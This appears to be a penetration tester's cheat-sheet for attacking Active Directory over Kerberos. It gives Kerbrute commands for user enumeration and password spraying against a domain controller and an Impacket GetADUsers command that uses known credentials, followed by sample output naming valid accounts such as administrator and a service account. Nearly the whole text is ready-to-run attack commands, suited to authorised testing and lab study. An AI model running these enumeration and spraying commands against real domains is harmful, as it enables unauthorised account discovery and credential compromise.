## Kerbrute 
```Enumerating AD users for kerberos attack (requires dc ip and wordlist)
using tool called kerbrute

To enumerate avalible users for kerberos authentication use command
here dc is for domain controller and d is for domain. d is necessary to specify
    ./kerbrute userenum --dc IPdomaincontroller -d CONTROLLER.local WordLists/ADusers.txt

If we have credentials of the machine then we can enumerate users more accurately with impacket
    GetADUSers.py -all domain.name/USER:PASS@computername -dc-ip IPADDRESS


User Enumeration
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>

Password Spray
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>


python kerbrute.py -users /home/kali/users.txt -domain domain.local -dc-ip 192.168.224.x
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Valid user => mute
[*] Valid user => administrator
[*] Blocked/Disabled user => krbtgt
[*] Valid user => svc_apache$
[*] No passwords were discovered :'(
```

